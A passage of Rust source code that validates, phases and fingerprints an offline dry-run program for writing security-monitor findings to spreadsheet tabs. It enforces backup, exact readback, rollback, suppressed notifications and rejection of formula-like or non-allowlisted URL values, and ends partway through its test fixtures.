    validate_notification(&bundle.notifier)?;
    if bundle.readback.on_failure != "block_notification_and_restore_from_backup"
        || !bundle.notification.requires_readback_success
    {
        return Err(ProgramError::invalid("bundle readback gate is incomplete"));
    }
    validate_target_identity_fields(target_value, policy)?;
    Ok(())
}

fn validate_notification(notification: &BundleNotification) -> Result<(), ProgramError> {
    if notification.action != "suppress"
        || notification.effective != "suppress"
        || notification.eligible
        || notification.recipient_policy != "unresolved"
        || !notification.recipients.is_empty()
        || !notification.requires_readback_success
        || !notification.authorization_required
    {
        return Err(ProgramError::invalid(
            "bundle notification recipients must remain unresolved and suppressed",
        ));
    }
    Ok(())
}

fn validate_operations(
    sheets: &BundleSheets,
    readback: &BundleReadback,
    policy: &WriterPolicy,
    target: &TargetPin,
) -> Result<(), ProgramError> {
    if sheets.tab_order
        != ["Findings", "Investigations", "Recommendations"]
            .into_iter()
            .map(str::to_string)
            .collect::<Vec<_>>()
        || sheets.operation_order
            != ["create", "update", "noop", "suppress"]
                .into_iter()
                .map(str::to_string)
                .collect::<Vec<_>>()
        || sheets.tabs.len() != 3
    {
        return Err(ProgramError::invalid("bundle sheet ordering is invalid"));
    }
    let mut total_operations = 0usize;
    let mut expected_assertions = Vec::new();
    let mut seen_ranges = BTreeSet::new();
    for (tab_index, tab) in sheets.tabs.iter().enumerate() {
        let (expected_name, expected_key_field, expected_range, prefix, columns) = match tab_index {
            0 => (
                "Findings",
                "eventId",
                "Findings!A:AB",
                "simv1-event-",
                28usize,
            ),
            1 => (
                "Investigations",
                "investigationId",
                "Investigations!A:O",
                "simv1-investigation-",
                15usize,
            ),
            2 => (
                "Recommendations",
                "recommendationId",
                "Recommendations!A:M",
                "simv1-recommendation-",
                13usize,
            ),
            _ => unreachable!(),
        };
        if (
            tab.name.as_str(),
            tab.key_field.as_str(),
            tab.range.as_str(),
            tab.lookup_range.as_str(),
        ) != (
            expected_name,
            expected_key_field,
            expected_range,
            expected_range,
        ) || !seen_ranges.insert(tab.range.clone())
        {
            return Err(ProgramError::invalid(
                "duplicate or overlapping sheet range",
            ));
        }
        let mut seen_keys = BTreeSet::new();
        let mut previous_order = None;
        for operation in &tab.operations {
            let order = (action_rank(&operation.action)?, operation.key.as_str());
            if previous_order.is_some_and(|previous| previous > order) {
                return Err(ProgramError::invalid("sheet operation ordering drift"));
            }
            previous_order = Some(order);
            if !seen_keys.insert(operation.key.clone()) {
                return Err(ProgramError::invalid(format!(
                    "duplicate key in {} operations",
                    tab.name
                )));
            }
            validate_key(&operation.key, prefix)?;
            if operation.lookup.range != expected_range
                || operation.lookup.key_field != expected_key_field
                || operation.lookup.key != operation.key
            {
                return Err(ProgramError::invalid(
                    "operation lookup does not pin exact key",
                ));
            }
            validate_safe_map(&operation.record)?;
            validate_safe_map(&operation.patch)?;
            validate_safe_map(&operation.preserved_human_fields)?;
            if operation
                .patch
                .keys()
                .any(|field| HUMAN_FIELDS.contains(&field.as_str()))
            {
                return Err(ProgramError::invalid(
                    "machine patch attempts to overwrite a human field",
                ));
            }
            expected_assertions.push((tab.name.clone(), operation));
            total_operations = total_operations
                .checked_add(1)
                .ok_or_else(|| ProgramError::invalid("operation count overflow"))?;
        }
        if tab.operations.len() > policy.limits.max_rows_per_tab
            || tab.operations.len().saturating_mul(columns) > policy.limits.max_cells_per_tab
        {
            return Err(ProgramError::invalid(format!(
                "{} exceeds policy capacity",
                tab.name
            )));
        }
    }
    if total_operations > policy.limits.max_operations {
        return Err(ProgramError::invalid(
            "operation count exceeds policy limit",
        ));
    }
    if readback.assertions.len() != expected_assertions.len() {
        return Err(ProgramError::invalid("readback assertions are incomplete"));
    }
    for ((expected_tab, operation), assertion) in
        expected_assertions.iter().zip(&readback.assertions)
    {
        if assertion.tab != *expected_tab
            || assertion.range != operation.lookup.range
            || assertion.key_field != operation.lookup.key_field
            || assertion.key != operation.key
            || assertion.action != operation.action
            || assertion.expected_machine_record != operation.record
            || !contains_all_strings(&assertion.preserved_human_fields, HUMAN_FIELDS)
        {
            return Err(ProgramError::invalid(
                "readback assertion does not match operation",
            ));
        }
    }
    if target.state_fingerprint.is_empty() {
        return Err(ProgramError::invalid("target fingerprint is empty"));
    }
    Ok(())
}

fn build_phases(
    bundle: &BundleInput,
    policy: &WriterPolicy,
    target: &TargetPin,
    bundle_fingerprint: &str,
    policy_fingerprint: &str,
) -> Vec<ProgramPhase> {
    let requires = |sequence: usize| {
        if sequence == 0 {
            None
        } else {
            Some(PHASE_NAMES[sequence - 1].to_string())
        }
    };
    let target_fingerprint = target.state_fingerprint.clone();
    let mut phases = vec![ProgramPhase {
        sequence: 1,
        name: PHASE_NAMES[0].to_string(),
        requires_receipt_from: requires(0),
        request: PhaseRequest::AdmitPreflight {
            expected_bundle_fingerprint: bundle_fingerprint.to_string(),
            expected_policy_fingerprint: policy_fingerprint.to_string(),
            expected_target_fingerprint: target_fingerprint.clone(),
            tenant_id: policy.tenant_id.clone(),
            spreadsheet_id: policy.spreadsheet_id.clone(),
            expected_schema_version: SCHEMA_VERSION,
            human_authorization_required: true,
            external_writes_allowed: false,
        },
    }];
    phases.push(ProgramPhase {
        sequence: 2,
        name: PHASE_NAMES[1].to_string(),
        requires_receipt_from: requires(1),
        request: PhaseRequest::BackupSnapshotPinning {
            snapshot_fingerprint: target_fingerprint.clone(),
            expected_revision: target.revision.clone(),
            expected_etag: target.etag.clone(),
            backup_required_before_writes: true,
            restore_instructions: bundle.rollback.steps.clone(),
            external_writes_allowed: false,
        },
    });
    phases.push(ProgramPhase {
        sequence: 3,
        name: PHASE_NAMES[2].to_string(),
        requires_receipt_from: requires(2),
        request: PhaseRequest::AdditiveSchemaMigration {
            from_version: bundle.migration.from_version,
            to_version: bundle.migration.to_version,
            additions: bundle.migration.additions.clone(),
            preserved_existing_fields: bundle.migration.preserved_existing_fields.clone(),
            forbidden_operations: bundle.migration.forbidden_operations.clone(),
            external_writes_allowed: false,
        },
    });
    for (phase_index, tab) in bundle.sheets.tabs.iter().enumerate() {
        let operations = tab
            .operations
            .iter()
            .map(|operation| WriteRequest {
                action: operation.action.clone(),
                key: operation.key.clone(),
                eligible: operation.eligible,
                range: tab.range.clone(),
                key_field: tab.key_field.clone(),
                reason: operation.reason.clone(),
                record: operation.record.clone(),
                patch: operation.patch.clone(),
                preserved_human_fields: operation.preserved_human_fields.clone(),
                expected_target_fingerprint: target_fingerprint.clone(),
                expected_revision: target.revision.clone(),
                external_write_performed: false,
            })
            .collect();
        phases.push(ProgramPhase {
            sequence: (phase_index + 4) as u8,
            name: PHASE_NAMES[phase_index + 3].to_string(),
            requires_receipt_from: requires(phase_index + 3),
            request: PhaseRequest::SheetWrites {
                tab: tab.name.clone(),
                range: tab.range.clone(),
                key_field: tab.key_field.clone(),
                expected_target_fingerprint: target_fingerprint.clone(),
                expected_revision: target.revision.clone(),
                external_writes_allowed: false,
                operations,
            },
        });
    }
    let assertions = bundle
        .readback
        .assertions
        .iter()
        .map(|assertion| ReadbackRequest {
            tab: assertion.tab.clone(),
            range: assertion.range.clone(),
            key_field: assertion.key_field.clone(),
            key: assertion.key.clone(),
            action: assertion.action.clone(),
            expected_machine_record: assertion.expected_machine_record.clone(),
            preserved_human_fields: assertion.preserved_human_fields.clone(),
        })
        .collect();
    phases.push(ProgramPhase {
        sequence: 7,
        name: PHASE_NAMES[6].to_string(),
        requires_receipt_from: requires(6),
        request: PhaseRequest::ExactReadback {
            expected_target_fingerprint: target_fingerprint.clone(),
            expected_revision: target.revision.clone(),
            assertions,
            notification_requires_success: true,
        },
    });
    phases.push(ProgramPhase {
        sequence: 8,
        name: PHASE_NAMES[7].to_string(),
        requires_receipt_from: requires(7),
        request: PhaseRequest::CommitOrRollback {
            on_success: "commit_logical_program_only".to_string(),
            on_failure: "rollback_from_pinned_snapshot".to_string(),
            restore_instructions: bundle.rollback.steps.clone(),
            notification_effective: "suppress".to_string(),
        },
    });
    phases.push(ProgramPhase {
        sequence: 9,
        name: PHASE_NAMES[8].to_string(),
        requires_receipt_from: requires(8),
        request: PhaseRequest::NotificationHandoff {
            recipient_policy: policy.recipient_policy.mode.clone(),
            to: policy.recipient_policy.to.clone(),
            bcc: policy.recipient_policy.bcc.clone(),
            effective: "suppress".to_string(),
            requires_readback_success: true,
            human_authorization_required: true,
            external_writes_allowed: false,
        },
    });
    phases
}

fn validate_program(program: &ExecutionProgram) -> Result<(), ProgramError> {
    if program.program_version != PROGRAM_VERSION
        || program.mode != "offline-simulation"
        || program.bundle_version != BUNDLE_VERSION
        || program.external_writes_allowed
        || program.live_apply_available
        || !program.human_authorization_required
        || program.notification.effective != "suppress"
        || !program.notification.requires_readback_success
        || !program.notification.human_authorization_required
        || program.notification.recipient_policy != "fixed"
        || program.notification.to.is_empty()
        || program.notification.bcc.is_empty()
    {
        return Err(ProgramError::invalid(
            "execution program violates safety contract",
        ));
    }
    validate_tenant_id(&program.target.tenant_id)?;
    validate_spreadsheet_id(&program.target.spreadsheet_id)?;
    if program.target.schema_version != SCHEMA_VERSION {
        return Err(ProgramError::invalid(
            "execution target schema version mismatch",
        ));
    }
    validate_fingerprint(
        "execution target fingerprint",
        &program.target.state_fingerprint,
    )?;
    validate_fingerprint("execution bundle fingerprint", &program.bundle_fingerprint)?;
    validate_fingerprint("execution policy fingerprint", &program.policy_fingerprint)?;
    validate_safe_token(
        &program.policy_id,
        "execution policy id",
        MAX_POLICY_ID_LENGTH,
    )?;
    validate_policy_limits(&program.policy_limits)?;
    for recipient in program
        .notification
        .to
        .iter()
        .chain(program.notification.bcc.iter())
    {
        validate_recipient(recipient)?;
    }
    let mut recipients = BTreeSet::new();
    for recipient in program
        .notification
        .to
        .iter()
        .chain(program.notification.bcc.iter())
    {
        if !recipients.insert(recipient) {
            return Err(ProgramError::invalid(
                "execution program contains duplicate notification recipient",
            ));
        }
    }
    if program.target.revision.is_none() && program.target.etag.is_none() {
        return Err(ProgramError::invalid(
            "execution target is missing revision or etag",
        ));
    }
    if let Some(revision) = &program.target.revision {
        validate_safe_token(revision, "execution target revision", 512)?;
    }
    if let Some(etag) = &program.target.etag {
        validate_safe_token(etag, "execution target etag", 512)?;
    }
    if program.phases.len() != PHASE_NAMES.len() {
        return Err(ProgramError::invalid(
            "execution program phase count is invalid",
        ));
    }
    for (index, phase) in program.phases.iter().enumerate() {
        if phase.sequence != (index + 1) as u8
            || phase.name != PHASE_NAMES[index]
            || phase.requires_receipt_from
                != if index == 0 {
                    None
                } else {
                    Some(PHASE_NAMES[index - 1].to_string())
                }
        {
            return Err(ProgramError::invalid(
                "execution program phase ordering drift",
            ));
        }
    }
    for (index, phase) in program.phases.iter().enumerate() {
        if !request_is_safe(&phase.request) {
            return Err(ProgramError::invalid(
                "execution request violates no-effect boundary",
            ));
        }
        validate_program_request(
            index,
            &phase.request,
            &program.target,
            &program.notification,
            &program.bundle_fingerprint,
            &program.policy_fingerprint,
        )?;
    }
    let actual = program
        .program_fingerprint
        .as_deref()
        .ok_or_else(|| ProgramError::invalid("execution program fingerprint is missing"))?;
    let expected = program_fingerprint(program)?;
    if actual != expected {
        return Err(ProgramError::invalid(
            "execution program fingerprint mismatch",
        ));
    }
    Ok(())
}

fn validate_program_request(
    index: usize,
    request: &PhaseRequest,
    target: &ProgramTargetPin,
    notification: &ProgramNotification,
    bundle_fingerprint: &str,
    policy_fingerprint: &str,
) -> Result<(), ProgramError> {
    match (index, request) {
        (
            0,
            PhaseRequest::AdmitPreflight {
                expected_target_fingerprint,
                expected_schema_version,
                human_authorization_required,
                external_writes_allowed,
                tenant_id,
                spreadsheet_id,
                expected_bundle_fingerprint,
                expected_policy_fingerprint,
            },
        ) => {
            if expected_bundle_fingerprint != bundle_fingerprint
                || expected_policy_fingerprint != policy_fingerprint
                || expected_target_fingerprint != &target.state_fingerprint
                || *expected_schema_version != SCHEMA_VERSION
                || !human_authorization_required
                || *external_writes_allowed
                || tenant_id != &target.tenant_id
                || spreadsheet_id != &target.spreadsheet_id
            {
                return Err(ProgramError::invalid("admission request is not pinned"));
            }
        }
        (
            1,
            PhaseRequest::BackupSnapshotPinning {
                snapshot_fingerprint,
                expected_revision,
                backup_required_before_writes,
                external_writes_allowed,
                ..
            },
        ) => {
            if snapshot_fingerprint != &target.state_fingerprint
                || expected_revision != &target.revision
                || !backup_required_before_writes
                || *external_writes_allowed
            {
                return Err(ProgramError::invalid("backup request is not pinned"));
            }
        }
        (
            2,
            PhaseRequest::AdditiveSchemaMigration {
                from_version,
                to_version,
                preserved_existing_fields,
                forbidden_operations,
                external_writes_allowed,
                ..
            },
        ) => {
            if *from_version != 6
                || *to_version != SCHEMA_VERSION
                || preserved_existing_fields.is_empty()
                || !contains_all_strings(
                    forbidden_operations,
                    &[
                        "delete_columns",
                        "delete_cells",
                        "delete_rows",
                        "reinterpret_existing_columns",
                        "overwrite_human_fields",
                    ],
                )
                || *external_writes_allowed
            {
                return Err(ProgramError::invalid(
                    "migration request is not additive-only",
                ));
            }
        }
        (
            3..=5,
            PhaseRequest::SheetWrites {
                tab,
                range,
                key_field,
                expected_target_fingerprint,
                expected_revision,
                external_writes_allowed,
                operations,
            },
        ) => {
            let tab_index = index - 3;
            let (expected_tab, expected_key_field, expected_range, prefix) = match tab_index {
                0 => ("Findings", "eventId", "Findings!A:AB", "simv1-event-"),
                1 => (
                    "Investigations",
                    "investigationId",
                    "Investigations!A:O",
                    "simv1-investigation-",
                ),
                _ => (
                    "Recommendations",
                    "recommendationId",
                    "Recommendations!A:M",
                    "simv1-recommendation-",
                ),
            };
            if (tab, key_field, range)
                != (
                    &expected_tab.to_string(),
                    &expected_key_field.to_string(),
                    &expected_range.to_string(),
                )
                || expected_target_fingerprint != &target.state_fingerprint
                || expected_revision != &target.revision
                || *external_writes_allowed
            {
                return Err(ProgramError::invalid("sheet write request is not pinned"));
            }
            let mut previous_order = None;
            for operation in operations {
                let order = (action_rank(&operation.action)?, operation.key.as_str());
                if previous_order.is_some_and(|previous| previous > order) {
                    return Err(ProgramError::invalid("program operation ordering drift"));
                }
                previous_order = Some(order);
                validate_key(&operation.key, prefix)?;
                if operation.external_write_performed
                    || operation.expected_target_fingerprint != target.state_fingerprint
                    || operation.expected_revision != target.revision
                    || operation
                        .patch
                        .keys()
                        .any(|field| HUMAN_FIELDS.contains(&field.as_str()))
                {
                    return Err(ProgramError::invalid("program write request is unsafe"));
                }
                validate_safe_map(&operation.record)?;
                validate_safe_map(&operation.patch)?;
                validate_safe_map(&operation.preserved_human_fields)?;
            }
        }
        (
            6,
            PhaseRequest::ExactReadback {
                expected_target_fingerprint,
                expected_revision,
                assertions,
                notification_requires_success,
            },
        ) => {
            if expected_target_fingerprint != &target.state_fingerprint
                || expected_revision != &target.revision
                || !notification_requires_success
                || assertions.iter().any(|assertion| {
                    !contains_all_strings(&assertion.preserved_human_fields, HUMAN_FIELDS)
                })
            {
                return Err(ProgramError::invalid("readback request is not exact"));
            }
        }
        (
            7,
            PhaseRequest::CommitOrRollback {
                on_failure,
                notification_effective,
                ..
            },
        ) => {
            if on_failure != "rollback_from_pinned_snapshot" || notification_effective != "suppress"
            {
                return Err(ProgramError::invalid("commit decision is not fail-closed"));
            }
        }
        (
            8,
            PhaseRequest::NotificationHandoff {
                recipient_policy,
                to,
                bcc,
                effective,
                requires_readback_success,
                human_authorization_required,
                external_writes_allowed,
            },
        ) => {
            if recipient_policy != &notification.recipient_policy
                || to != &notification.to
                || bcc != &notification.bcc
                || effective != "suppress"
                || !requires_readback_success
                || !human_authorization_required
                || *external_writes_allowed
            {
                return Err(ProgramError::invalid(
                    "notification request is not suppressed",
                ));
            }
        }
        _ => {
            return Err(ProgramError::invalid(
                "phase request type does not match phase",
            ))
        }
    }
    Ok(())
}

fn request_is_safe(request: &PhaseRequest) -> bool {
    match request {
        PhaseRequest::AdmitPreflight {
            human_authorization_required,
            external_writes_allowed,
            ..
        } => *human_authorization_required && !external_writes_allowed,
        PhaseRequest::BackupSnapshotPinning {
            backup_required_before_writes,
            external_writes_allowed,
            ..
        } => *backup_required_before_writes && !external_writes_allowed,
        PhaseRequest::AdditiveSchemaMigration {
            external_writes_allowed,
            ..
        }
        | PhaseRequest::SheetWrites {
            external_writes_allowed,
            ..
        }
        | PhaseRequest::NotificationHandoff {
            external_writes_allowed,
            ..
        } => !external_writes_allowed,
        PhaseRequest::ExactReadback {
            notification_requires_success,
            ..
        } => *notification_requires_success,
        PhaseRequest::CommitOrRollback {
            notification_effective,
            ..
        } => notification_effective == "suppress",
    }
}

fn program_fingerprint(program: &ExecutionProgram) -> Result<String, ProgramError> {
    let mut unsigned = program.clone();
    unsigned.program_fingerprint = None;
    let value = serde_json::to_value(unsigned)
        .map_err(|_| ProgramError::invalid("could not serialize unsigned program"))?;
    Ok(fingerprint_value(&value))
}

struct ReceiptEvent<'a> {
    program_fingerprint: &'a str,
    phase: &'a str,
    status: &'a str,
    state_before: &'a str,
    state_after: &'a str,
    readback_assertions_succeeded: bool,
}

fn push_receipt(
    receipts: &mut Vec<PhaseReceipt>,
    transitions: &mut Vec<StateTransition>,
    event: ReceiptEvent<'_>,
) -> Result<(), ProgramError> {
    let mut receipt = PhaseReceipt {
        receipt_version: RECEIPT_VERSION.to_string(),
        sequence: receipts.len() as u64 + 1,
        phase: event.phase.to_string(),
        status: event.status.to_string(),
        program_fingerprint: event.program_fingerprint.to_string(),
        previous_receipt_fingerprint: receipts
            .last()
            .and_then(|item| item.receipt_fingerprint.clone()),
        external_writes_performed: false,
        write_intents_applied: false,
        notification_effective: "suppress".to_string(),
        readback_assertions_succeeded: event.readback_assertions_succeeded,
        state_before: event.state_before.to_string(),
        state_after: event.state_after.to_string(),
        receipt_fingerprint: None,
    };
    receipt.receipt_fingerprint = Some(receipt_fingerprint(&receipt)?);
    transitions.push(StateTransition {
        sequence: receipt.sequence,
        from: event.state_before.to_string(),
        to: event.state_after.to_string(),
        receipt_phase: event.phase.to_string(),
    });
    receipts.push(receipt);
    Ok(())
}

fn receipt_fingerprint(receipt: &PhaseReceipt) -> Result<String, ProgramError> {
    let mut unsigned = receipt.clone();
    unsigned.receipt_fingerprint = None;
    let value = serde_json::to_value(unsigned)
        .map_err(|_| ProgramError::invalid("could not serialize unsigned receipt"))?;
    Ok(fingerprint_value(&value))
}

fn phase_success_state(phase: &str) -> String {
    match phase {
        "admit_preflight" => "admitted".to_string(),
        "backup_snapshot_pinning" => "backup_pinned".to_string(),
        "additive_schema_migration" => "migration_planned".to_string(),
        "findings_writes" => "findings_write_manifest_verified".to_string(),
        "investigations_writes" => "investigations_write_manifest_verified".to_string(),
        "recommendations_writes" => "recommendations_write_manifest_verified".to_string(),
        "exact_readback" => "readback_succeeded".to_string(),
        "commit_or_rollback" => "committed_logical_program".to_string(),
        "notification_handoff" => "notification_suppressed".to_string(),
        _ => "unknown".to_string(),
    }
}

fn receipts_are_sequential(receipts: &[PhaseReceipt]) -> bool {
    receipts
        .iter()
        .enumerate()
        .all(|(index, receipt)| receipt.sequence == (index + 1) as u64)
}

fn no_write_before_admission_and_backup(receipts: &[PhaseReceipt]) -> bool {
    let mut admission_succeeded = false;
    let mut backup_succeeded = false;
    for receipt in receipts {
        let write_effect = receipt.external_writes_performed || receipt.write_intents_applied;
        if write_effect && !(admission_succeeded && backup_succeeded) {
            return false;
        }
        if receipt.phase == "admit_preflight" && receipt.status == "succeeded" {
            admission_succeeded = true;
        }
        if receipt.phase == "backup_snapshot_pinning" && receipt.status == "succeeded" {
            backup_succeeded = true;
        }
    }
    true
}

fn receipts_follow_success(receipts: &[PhaseReceipt]) -> bool {
    let mut failure_observed = false;
    for receipt in receipts {
        if receipt.phase == "rollback" {
            if !failure_observed || receipt.sequence != receipts.len() as u64 {
                return false;
            }
            continue;
        }
        if failure_observed {
            return false;
        }
        if receipt.status == "failed" {
            failure_observed = true;
        } else if receipt.status != "succeeded"
            && !(receipt.phase == "notification_handoff" && receipt.status == "suppressed")
        {
            return false;
        }
    }
    true
}

fn readback_precedes_notification(receipts: &[PhaseReceipt]) -> bool {
    let Some(readback_index) = receipts.iter().position(|receipt| {
        receipt.phase == "exact_readback"
            && receipt.status == "succeeded"
            && receipt.readback_assertions_succeeded
    }) else {
        return false;
    };
    receipts
        .iter()
        .position(|receipt| receipt.phase == "notification_handoff")
        .is_some_and(|notification_index| notification_index > readback_index)
}

fn validate_target_identity_fields(
    target: &Value,
    policy: &WriterPolicy,
) -> Result<(), ProgramError> {
    if let Some(tenant_id) = target.get("tenantId") {
        if tenant_id.as_str() != Some(policy.tenant_id.as_str()) {
            return Err(ProgramError::invalid(
                "target tenant identity mismatches policy",
            ));
        }
    }
    if let Some(spreadsheet_id) = target.get("spreadsheetId") {
        if spreadsheet_id.as_str() != Some(policy.spreadsheet_id.as_str()) {
            return Err(ProgramError::invalid(
                "target spreadsheet identity mismatches policy",
            ));
        }
    }
    Ok(())
}

fn optional_target_text(
    target: &Map<String, Value>,
    snapshot: Option<&Map<String, Value>>,
    fields: &[&str],
    label: &str,
) -> Result<Option<String>, ProgramError> {
    for source in [snapshot, Some(target)] {
        let Some(source) = source else {
            continue;
        };
        for field in fields {
            let Some(value) = source.get(*field) else {
                continue;
            };
            let text = value
                .as_str()
                .ok_or_else(|| ProgramError::invalid(format!("{label} must be text")))?;
            validate_safe_token(text, label, 512)?;
            return Ok(Some(text.to_string()));
        }
    }
    Ok(None)
}

fn validate_tenant_id(value: &str) -> Result<(), ProgramError> {
    if value.len() > MAX_TENANT_ID_LENGTH
        || value.is_empty()
        || value != value.to_ascii_lowercase()
        || value == "example.com"
        || value == "example.invalid"
        || value.ends_with(".invalid")
        || value.split('.').count() < 2
        || value
            .split('.')
            .any(|label| label.is_empty() || label.starts_with('-') || label.ends_with('-'))
        || !value.chars().all(|character| {
            character.is_ascii_alphanumeric() || character == '.' || character == '-'
        })
    {
        return Err(ProgramError::invalid("invalid tenant identity"));
    }
    Ok(())
}

fn validate_spreadsheet_id(value: &str) -> Result<(), ProgramError> {
    if value.is_empty()
        || value.len() > MAX_SPREADSHEET_ID_LENGTH
        || !value.chars().all(|character| {
            character.is_ascii_alphanumeric() || character == '_' || character == '-'
        })
    {
        return Err(ProgramError::invalid("invalid spreadsheet identity"));
    }
    Ok(())
}

fn validate_recipient(value: &str) -> Result<(), ProgramError> {
    let mut parts = value.split('@');
    let local = parts.next().unwrap_or_default();
    let domain = parts.next().unwrap_or_default();
    if parts.next().is_some()
        || local.is_empty()
        || domain.is_empty()
        || value.len() > 254
        || value
            .chars()
            .any(|character| character.is_control() || character.is_whitespace())
        || domain != domain.to_ascii_lowercase()
        || domain == "example.com"
        || domain == "example.invalid"
        || domain.ends_with(".invalid")
        || domain.split('.').count() < 2
        || !local.chars().all(|character| {
            character.is_ascii_alphanumeric() || ".!#$%&'*+-/=?^_`{|}~".contains(character)
        })
    {
        return Err(ProgramError::invalid("invalid notification recipient"));
    }
    validate_tenant_id(domain)
}

fn validate_safe_token(value: &str, field: &str, max_length: usize) -> Result<(), ProgramError> {
    if value.is_empty()
        || value.chars().count() > max_length
        || value
            .chars()
            .any(|character| character.is_control() || character.is_whitespace())
        || value.contains('/')
        || value.contains('?')
        || value.contains('#')
    {
        return Err(ProgramError::invalid(format!("invalid {field}")));
    }
    Ok(())
}

fn validate_key(value: &str, prefix: &str) -> Result<(), ProgramError> {
    if !value.starts_with(prefix)
        || value.len() > 256
        || value
            .chars()
            .any(|character| character.is_control() || character.is_whitespace())
        || value.contains(['/', '?', '#'])
    {
        return Err(ProgramError::invalid("invalid exact operation key"));
    }
    Ok(())
}

fn validate_safe_map(map: &BTreeMap<String, Value>) -> Result<(), ProgramError> {
    for (key, value) in map {
        validate_safe_token(key, "record field", 128)?;
        validate_safe_value(value)?;
    }
    Ok(())
}

fn validate_safe_value(value: &Value) -> Result<(), ProgramError> {
    match value {
        Value::String(text) => {
            if text.chars().any(|character| character.is_control())
                || text.trim_start().starts_with(['=', '+', '-', '@'])
            {
                return Err(ProgramError::invalid("unsafe formula-like record value"));
            }
            if (text.contains("http://") || text.contains("https://"))
                && !ALLOWED_URLS.iter().any(|url| text == *url)
            {
                return Err(ProgramError::invalid("unsafe non-allowlisted URL"));
            }
            Ok(())
        }
        Value::Array(items) => items.iter().try_for_each(validate_safe_value),
        Value::Object(fields) => fields.values().try_for_each(validate_safe_value),
        _ => Ok(()),
    }
}

fn action_rank(action: &str) -> Result<u8, ProgramError> {
    match action {
        "create" => Ok(0),
        "update" => Ok(1),
        "noop" => Ok(2),
        "suppress" => Ok(3),
        _ => Err(ProgramError::invalid("unknown sheet operation")),
    }
}

fn contains_all_strings(values: &[String], required: &[&str]) -> bool {
    required
        .iter()
        .all(|item| values.iter().any(|value| value == item))
}

fn validate_fingerprint(field: &str, value: &str) -> Result<(), ProgramError> {
    let Some(hex) = value.strip_prefix("sha256:") else {
        return Err(ProgramError::invalid(format!("invalid {field}")));
    };
    if hex.len() != 64 || !hex.chars().all(|character| character.is_ascii_hexdigit()) {
        return Err(ProgramError::invalid(format!("invalid {field}")));
    }
    Ok(())
}

fn target_state_fingerprint(target: &Value) -> Result<String, ProgramError> {
    let object = target
        .as_object()
        .ok_or_else(|| ProgramError::invalid("target snapshot must be an object"))?;
    let mut state = Map::new();
    for field in [
        "schemaVersion",
        "findings",
        "investigations",
        "recommendations",
    ] {
        let value = object.get(field).cloned().unwrap_or_else(|| match field {
            "findings" | "investigations" | "recommendations" => Value::Array(Vec::new()),
            _ => Value::Null,
        });
        state.insert(field.to_string(), value);
    }
    Ok(fingerprint_value_with_sorted_arrays(&Value::Object(state)))
}

fn fingerprint_value(value: &Value) -> String {
    fingerprint_bytes(&canonicalize_json(value, false))
}

fn fingerprint_value_with_sorted_arrays(value: &Value) -> String {
    fingerprint_bytes(&canonicalize_json(value, true))
}

fn fingerprint_bytes(value: &Value) -> String {
    let bytes = serde_json::to_vec(value).expect("JSON values should serialize");
    let digest = Sha256::digest(bytes);
    format!(
        "sha256:{}",
        digest
            .iter()
            .map(|byte| format!("{byte:02x}"))
            .collect::<String>()
    )
}

fn canonicalize_json(value: &Value, sort_arrays: bool) -> Value {
    match value {
        Value::Object(fields) => {
            let mut canonical = Map::new();
            for (key, item) in fields {
                canonical.insert(key.clone(), canonicalize_json(item, sort_arrays));
            }
            Value::Object(canonical)
        }
        Value::Array(items) => {
            let mut canonical = items
                .iter()
                .map(|item| canonicalize_json(item, sort_arrays))
                .collect::<Vec<_>>();
            if sort_arrays {
                canonical.sort_by(|left, right| {
                    serde_json::to_vec(left)
                        .expect("JSON values should serialize")
                        .cmp(&serde_json::to_vec(right).expect("JSON values should serialize"))
                });
            }
            Value::Array(canonical)
        }
        scalar => scalar.clone(),
    }
}

#[cfg(test)]
mod tests {
    use serde_json::{json, Value};
    use sha2::{Digest, Sha256};

    fn target_state_fingerprint_for_test(target: &Value) -> String {
        let state = json!({
            "schemaVersion": target["schemaVersion"],
            "findings": target["findings"],
            "investigations": target["investigations"],
            "recommendations": target["recommendations"]
        });
        let digest = Sha256::digest(serde_json::to_vec(&state).expect("state serializes"));
        format!(
            "sha256:{}",
            digest
                .iter()
                .map(|byte| format!("{byte:02x}"))
                .collect::<String>()
        )
    }

    fn target() -> Value {
        let mut target = json!({
            "schemaVersion": 7,
            "spreadsheetId": "1SpreadsheetStableId_1234567890",
            "tenantId": "wearenexa.com",
            "findings": [],
            "investigations": [],
            "recommendations": [],
            "snapshot": {
                "revision": "revision-7",
                "etag": "etag-7"
            }
        });
        let state_fingerprint = target_state_fingerprint_for_test(&target);
        target["snapshot"]["stateFingerprint"] = json!(state_fingerprint);
        target
    }

    fn policy() -> Value {
        json!({
            "policyVersion": "security_intelligence_monitor_writer_policy_v1",
            "policyId": "writer-policy-2026-08",
            "tenantId": "wearenexa.com",
            "spreadsheetId": "1SpreadsheetStableId_1234567890",
            "schemaVersion": 7,
            "recipientPolicy": {
                "mode": "fixed",
                "to": ["workspace-security@wearenexa.com"],
                "bcc": ["facundo.garat@wearenexa.com"]
            },
            "limits": {
                "maxRowsPerTab": 10000,
                "maxCellsPerTab": 300000,
                "maxOperations": 100
            }
        })
    }

    fn operation(action: &str, key_field: &str, key: &str, range: &str) -> Value {
        let record = json!({key_field: key, "machineValue": format!("machine-{key}")});
        json!({
            "action": action,
            "key": key,
            "eligible": true,
            "reason": "new_exact_key",
            "lookup": {"range": range, "keyField": key_field, "key": key},
            "record": record,
            "patch": {},
            "preservedHumanFields": {}
        })
    }

    fn bundle() -> Value {
        let target = target();
        let target_fingerprint = target_state_fingerprint_for_test(&target);
        let findings = operation(
            "create",
            "eventId",
            "simv1-event-00000000-0000-0000-0000-000000000001",
            "Findings!A:AB",
        );
        let investigations = operation(
            "create",
            "investigationId",
            "simv1-investigation-00000000-0000-0000-0000-000000000001",
            "Investigations!A:O",
        );
        let recommendations = operation(
            "create",
            "recommendationId",
            "simv1-recommendation-00000000-0000-0000-0000-000000000001",
            "Recommendations!A:M",
        );
        let assertions = [&findings, &investigations, &recommendations]
            .into_iter()
            .map(|operation| {
                json!({
                    "tab": if operation["lookup"]["keyField"] == "eventId" { "Findings" } else if operation["lookup"]["keyField"] == "investigationId" { "Investigations" } else { "Recommendations" },
                    "range": operation["lookup"]["range"],
                    "keyField": operation["lookup"]["keyField"],
                    "key": operation["key"],
                    "action": operation["action"],
                    "expectedMachineRecord": operation["record"],
                    "preservedHumanFields": super::HUMAN_FIELDS
                })
            })
            .collect::<Vec<_>>();
        json!({
            "bundleVersion": "security_intelligence_monitor_cutover_bundle_v1",
            "mode": "dry-run",
            "status": "eligible_pending_authorization",
            "externalWritesAllowed": false,
            "emailAllowed": false,
            "fingerprints": {
                "algorithm": "sha256-canonical-json-v1",
